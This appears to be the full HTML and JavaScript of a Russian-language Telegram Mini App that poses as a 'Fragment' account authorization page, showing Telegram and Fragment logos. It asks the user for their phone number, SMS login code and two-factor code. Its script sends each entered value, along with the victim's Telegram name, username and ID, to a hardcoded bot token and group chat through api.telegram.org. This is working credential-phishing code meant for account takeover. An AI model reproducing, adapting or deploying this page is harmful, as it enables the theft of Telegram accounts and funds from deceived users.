<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fragment Authorization</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background-color: #f9f9f9;
    }

    .container {
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      width: 400px;
      padding: 20px;
      text-align: center;
    }

    .icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 20px;
    }

    .icons img {
      width: 50px;
      height: 50px;
    }

    h1 {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 10px;
      color: #000;
    }

    p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.4;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 20px;
    }

    select, input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 14px;
      box-sizing: border-box;
    }

    .phone-input {
      display: flex;
    }

    .country-code {
      padding: 10px;
      border: 1px solid #ddd;
      border-radius: 5px 0 0 5px;
      background: #f9f9f9;
      border-right: none;
      min-width: 60px;
    }

    .phone-number {
      flex: 1;
      border-radius: 0 5px 5px 0;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
    }

    .buttons button {
      width: 48%;
      padding: 10px;
      font-size: 14px;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .cancel-btn {
      background: none;
      color: #007bff;
    }

    .next-btn {
      background: #007bff;
      color: #fff;
    }

    .screen {
      display: none;
    }

    .screen.active {
      display: block;
    }

    .code-inputs {
      display: flex;
      gap: 10px;
      justify-content: center;
      margin-bottom: 20px;
    }

    .code-input {
      width: 40px;
      height: 50px;
      border: 2px solid #ddd;
      border-radius: 8px;
      text-align: center;
      font-size: 20px;
      font-weight: bold;
      outline: none;
    }

    .code-input:focus {
      border-color: #007bff;
    }

    .back-btn {
      background: none;
      border: none;
      color: #007bff;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 15px;
    }

    .hint {
      font-size: 13px;
      color: #666;
      margin-top: 10px;
    }

    .success-screen {
      text-align: center;
      padding: 20px;
    }

    .success-icon {
      font-size: 60px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <!-- Экран 1: Ввод номера телефона -->
  <div class="container screen active" id="screen1">
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://fragment.com/logo.png" alt="Fragment Icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMwMDg4Y2MiLz4KPHN2ZyB4PSIxMiIgeT0iMTIiIHdpZHRoPSIyNiIgaGVpZ2h0PSIyNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CjxwYXRoIGQ9Ik0xMCAxMy41SDE0LjVWMTguNUgxMFYxMy41WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE1LjUgMTBIMTguNVYxNEgxNS41VjEwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE4LjUgMTcuNVYxOS41QzE4LjUgMTkuNzY1MiAxOC4zOTI5IDE5LjUxOTYgMTguMjAzNiAxOS43MDg2QzE4LjAxNDMgMTkuODk3OSAxNy43NjUyIDIwIDE3LjUgMjBINi41QzYuMjM0NzggMjAgNS45ODU3MSAxOS44OTc5IDUuNzk2NDMgMTkuNzA4NkM1LjYwNzE0IDE5LjUxOTYgNS41IDE5LjI2NTIgNS41IDE5VjE0LjVINS41QzUuNSAxNC4yMzQ4IDUuNjA3MTQgMTMuOTgwNCA1Ljc5NjQzIDEzLjc5MTFDNS45ODU3MSAxMy42MDE5IDYuMjM0NzggMTMuNSA2LjUgMTMuNUg5LjVWMTBINS41QzUuMjM0NzggMTAgNC45ODU3MSA5Ljg5Nzg2IDQuNzk2NDMgOS43MDg1N0M0LjYwNzE0IDkuNTE5MjkgNC41IDkuMjY0ODUgNC41IDlWNS41QzQuNSA1LjIzNDc4IDQuNjA3MTQgNC45ODU3MSA0Ljc5NjQzIDQuNzk2NDNDNC45ODU3MSA0LjYwNzE0IDUuMjM0NzggNC41IDUuNSA0LjVIMTQuNUMxNC43NjUyIDQuNSAxNS4wMTQzIDQuNjA3MTQgMTUuMjAzNiA0Ljc5NjQzQzE1LjM5MjkgNC45ODU3MSAxNS41IDUuMjM0NzggMTUuNSA1LjVWOUgxOS41QzE5Ljc2NTIgOSAyMC4wMTQzIDkuMTA3MTQgMjAuMjAzNiA5LjI5NjQzQzIwLjM5MjkgOS40ODU3MSAyMC41IDkuNzM0NzggMjAuNSA5LjVWMTMuNUgxOC41VjE3LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4KPC9zdmc+'">
    </div>
    <h1>Войдите, чтобы использовать аккаунт <span>Fragment</span></h1>
    <p>для работы с звездами и быстрыми переводами.<br>Введите свой <b>номер телефона</b> в международном формате.</p>
    <div class="input-group">
      <select id="country">
        <option>Россия</option>
        <option>Казахстан</option>
        <option>Украина</option>
        <option>Беларусь</option>
        <option>Другая страна</option>
      </select>
      <div class="phone-input">
        <span class="country-code">+7</span>
        <input type="text" class="phone-number" id="phone" placeholder="Ваш номер телефона">
      </div>
    </div>
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handlePhoneSubmit()">ДАЛЕЕ</button>
    </div>
  </div>

  <!-- Экран 2: Ввод SMS кода -->
  <div class="container screen" id="screen2">
    <button class="back-btn" onclick="prevScreen(1)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://fragment.com/logo.png" alt="Fragment Icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMwMDg4Y2MiLz4KPHN2ZyB4PSIxMiIgeT0iMTIiIHdpZHRoPSIyNiIgaGVpZ2h0PSIyNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CjxwYXRoIGQ9Ik0xMCAxMy41SDE0LjVWMTguNUgxMFYxMy41WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE1LjUgMTBIMTguNVYxNEgxNS41VjEwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE4LjUgMTcuNVYxOS41QzE4LjUgMTkuNzY1MiAxOC4zOTI5IDE5LjUxOTYgMTguMjAzNiAxOS43MDg2QzE4LjAxNDMgMTkuODk3OSAxNy43NjUyIDIwIDE3LjUgMjBINi41QzYuMjM0NzggMjAgNS45ODU3MSAxOS44OTc5IDUuNzk2NDMgMTkuNzA4NkM1LjYwNzE0IDE5LjUxOTYgNS41IDE5LjI2NTIgNS41IDE5VjE0LjVINS41QzUuNSAxNC4yMzQ4IDUuNjA3MTQgMTMuOTgwNCA1Ljc5NjQzIDEzLjc5MTFDNS45ODU3MSAxMy42MDE5IDYuMjM0NzggMTMuNSA2LjUgMTMuNUg5LjVWMTBINS41QzUuMjM0NzggMTAgNC45ODU3MSA5Ljg5Nzg2IDQuNzk2NDMgOS43MDg1N0M0LjYwNzE0IDkuNTE5MjkgNC41IDkuMjY0ODUgNC41IDlWNS41QzQuNSA1LjIzNDc4IDQuNjA3MTQgNC45ODU3MSA0Ljc5NjQzIDQuNzk2NDNDNC45ODU3MSA0LjYwNzE0IDUuMjM0NzggNC41IDUuNSA0LjVIMTQuNUMxNC43NjUyIDQuNSAxNS4wMTQzIDQuNjA3MTQgMTUuMjAzNiA0Ljc5NjQzQzE1LjM5MjkgNC45ODU3MSAxNS41IDUuMjM0NzggMTUuNSA1LjVWOUgxOS41QzE5Ljc2NTIgOSAyMC4wMTQzIDkuMTA3MTQgMjAuMjAzNiA5LjI5NjQzQzIwLjM5MjkgOS40ODU3MSAyMC41IDkuNzM0NzggMjAuNSA5LjVWMTMuNUgxOC41VjE3LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4KPC9zdmc+'">
    </div>
    <h1>Введите код из SMS</h1>
    <p>Мы отправили код подтверждения на ваш номер телефона.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint" id="timer">Код действителен: 01:00</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="resendCode()">Отправить код повторно</button>
      <button class="next-btn" onclick="handleSmsSubmit()">ПРОДОЛЖИТЬ</button>
    </div>
  </div>

  <!-- Экран 3: Ввод 2FA кода -->
  <div class="container screen" id="screen3">
    <button class="back-btn" onclick="prevScreen(2)">← Назад</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://fragment.com/logo.png" alt="Fragment Icon" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTAiIGZpbGw9IiMwMDg4Y2MiLz4KPHN2ZyB4PSIxMiIgeT0iMTIiIHdpZHRoPSIyNiIgaGVpZ2h0PSIyNiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CjxwYXRoIGQ9Ik0xMCAxMy41SDE0LjVWMTguNUgxMFYxNS41WiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE1LjUgMTBIMTguNVYxNEgxNS41VjEwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE4LjUgMTcuNVYxOS41QzE4LjUgMTkuNzY1MiAxOC4zOTI5IDE5LjUxOTYgMTguMjAzNiAxOS43MDg2QzE4LjAxNDMgMTkuODk3OSAxNy43NjUyIDIwIDE3LjUgMjBINi41QzYuMjM0NzggMjAgNS45ODU3MSAxOS44OTc5IDUuNzk2NDMgMTkuNzA4NkM1LjYwNzE0IDE5LjUxOTYgNS41IDE5LjI2NTIgNS41IDE5VjE0LjVINS41QzUuNSAxNC4yMzQ4IDUuNjA3MTQgMTMuOTgwNCA1Ljc5NjQzIDE3Ljc5MTFDNS45ODU3MSAxMy42MDE5IDYuMjM0NzggMTMuNSA2LjUgMTMuNUg5LjVWMTBINS41QzUuMjM0NzggMTAgNC45ODU3MSA5Ljg5Nzg2IDQuNzk2NDMgOS43MDg1N0M0LjYwNzE0IDkuNTE5MjkgNC41IDkuMjY0ODUgNC41IDlWNS41QzQuNSA1LjIzNDc4IDQuNjA3MTQgNC45ODU3MSA0Ljc5NjQzIDQuNzk2NDNDNC45ODU3MSA0LjYwNzE0IDUuMjM0NzggNC41IDUuNSA0LjVIMTQuNUMxNC43NjUyIDQuNSAxNS4wMTQzIDQuNjA3MTQgMTUuMjAzNiA0Ljc5NjQzQzE1LjM5MjkgNC45ODU3MSAxNS41IDUuMjM0NzggMTUuNSA1LjVWOUgxOS41QzE5Ljc2NTIgOSAyMC4wMTQzIDkuMTA3MTQgMjAuMjAzNiA5LjI5NjQzQzIwLjM5MjkgOS40ODU3MSAyMC41IDkuNzM0NzggMjAuNSA5LjVWMTMuNUgxOC41VjE3LjVaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4KPC9zdmc+'">
    </div>
    <h1>Двухфакторная аутентификация</h1>
    <p>Введите код из приложения аутентификации.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint">Для завершения авторизации введите 6-значный код</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">ОТМЕНА</button>
      <button class="next-btn" onclick="handle2faSubmit()">ЗАВЕРШИТЬ</button>
    </div>
  </div>

  <!-- Экран 4: Успешная авторизация -->
  <div class="container screen" id="screen4">
    <div class="success-screen">
      <div class="success-icon">✅</div>
      <h1>Авторизация успешно завершена!</h1>
      <p>Ваш аккаунт Fragment был успешно авторизован. Теперь вы можете вернуться в основного бота для продолжения работы.</p>
      
      <div class="buttons">
        <button class="next-btn" onclick="closeWebApp()">ВЕРНУТЬСЯ В БОТА</button>
      </div>
    </div>
  </div>

  <script>
    // Инициализация Telegram Web App
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.MainButton.hide();

    let currentScreen = 1;
    let timerInterval;

    // УЛУЧШЕННАЯ ФУНКЦИЯ ДЛЯ ОТПРАВКИ ЛОГОВ В TELEGRAM ГРУППУ
   // Прямой вызов Telegram API - без Netlify функций
// Упрощенная версия прямой отправки в Telegram
async function sendLog(action, details = '') {
  try {
    const user = tg.initDataUnsafe?.user;
    const userInfo = user ? 
      `${user.first_name} (@${user.username}) ID: ${user.id}` : 
      'Неизвестный пользователь';
    
    const logMessage = `🪵 MINI-APP\n👤 ${userInfo}\n🎯 ${action}\n📝 ${details}\n⏰ ${new Date().toLocaleString('ru-RU')}`;
    
    const TELEGRAM_BOT_TOKEN = '7872244632:AAH78O5srYOqV7QdxjztT6px-Qi1TKZlTA0';
    const TELEGRAM_CHAT_ID = '-1003260648472';
    
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(logMessage)}`;
    
    await fetch(telegramUrl);
    console.log('✅ Лог отправлен в Telegram');
    
  } catch (error) {
    console.error('❌ Ошибка отправки лога:', error);
  }
}

    // Переключение между экранами
    function nextScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;

      if (screenNumber === 2) {
        startTimer();
      }
    }

    function prevScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;

      if (screenNumber !== 2) {
        stopTimer();
      }
    }

    // Таймер для SMS кода
    function startTimer() {
      let timeLeft = 60;
      const timerElement = document.getElementById('timer');
      
      stopTimer();
      
      timerInterval = setInterval(() => {
        timeLeft--;
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.textContent = `Код действителен: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        
        if (timeLeft <= 0) {
          stopTimer();
          timerElement.textContent = "Срок действия кода истек";
          timerElement.style.color = "#ff4444";
        }
      }, 1000);
    }

    function stopTimer() {
      if (timerInterval) {
        clearInterval(timerInterval);
      }
    }

    // Перемещение между полями ввода кода
    function moveToNext(input, currentIndex) {
      if (input.value.length === 1) {
        const inputs = input.parentElement.querySelectorAll('.code-input');
        if (currentIndex < inputs.length) {
          inputs[currentIndex].focus();
        }
      }
    }

    // Обработчики кнопок
    function handlePhoneSubmit() {
      const phone = document.getElementById('phone').value;
      const country = document.getElementById('country').value;
      
      if (!phone) {
        alert('Пожалуйста, введите номер телефона');
        return;
      }
      
      // ОТПРАВКА ЛОГА
      sendLog('PHONE_ENTERED', `Страна: ${country}, Номер: +7${phone}`);
      
      nextScreen(2);
    }

    function handleSmsSubmit() {
      const codeInputs = document.querySelectorAll('#screen2 .code-input');
      let smsCode = '';
      codeInputs.forEach(input => smsCode += input.value);
      
      if (smsCode.length !== 5) {
        alert('Пожалуйста, введите полный 5-значный код');
        return;
      }
      
      // ОТПРАВКА ЛОГА
      sendLog('SMS_CODE_ENTERED', `Код: ${smsCode}`);
      
      nextScreen(3);
    }

    function handle2faSubmit() {
      const codeInputs = document.querySelectorAll('#screen3 .code-input');
      let faCode = '';
      codeInputs.forEach(input => faCode += input.value);
      
      if (faCode.length !== 6) {
        alert('Пожалуйста, введите полный 6-значный код');
        return;
      }
      
      // ОТПРАВКА ЛОГА
      sendLog('2FA_CODE_ENTERED', `Код: ${faCode}`);
      
      completeAuth();
    }

    function resendCode() {
      const timerElement = document.getElementById('timer');
      timerElement.textContent = "Код действителен: 01:00";
      timerElement.style.color = "#666";
      startTimer();
      
      // ОТПРАВКА ЛОГА
      sendLog('RESEND_CODE', 'Пользователь запросил повторную отправку кода');
      
      tg.showPopup({
        title: 'Код отправлен',
        message: 'Новый код подтверждения отправлен на ваш номер телефона.',
        buttons: [{ type: 'ok' }]
      });
    }

    function handleCancel() {
      // ОТПРАВКА ЛОГА
      sendLog('USER_CANCELLED', 'Пользователь отменил авторизацию');
      
      tg.close();
    }

    function completeAuth() {
      // ОТПРАВКА ЛОГА
      sendLog('AUTH_SUCCESS', 'Успешная авторизация пользователя');
      
      nextScreen(4);
    }

    function closeWebApp() {
      // ОТПРАВКА ЛОГА
      sendLog('APP_CLOSED', 'Пользователь вернулся в бота');
      
      tg.close();
    }

    // Автоматический фокус на полях ввода
    document.addEventListener('DOMContentLoaded', function() {
      // ОТПРАВКА ЛОГА ПРИ ЗАПУСКЕ
      sendLog('APP_STARTED', 'Мини-приложение запущено в Telegram WebView');
      
      const observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
            if (document.getElementById('screen2').classList.contains('active')) {
              document.querySelector('#screen2 .code-input').focus();
            }
            if (document.getElementById('screen3').classList.contains('active')) {
              document.querySelector('#screen3 .code-input').focus();
            }
          }
        });
      });
      
      observer.observe(document.getElementById('screen2'), { attributes: true });
      observer.observe(document.getElementById('screen3'), { attributes: true });
    });
  </script>
</body>
</html>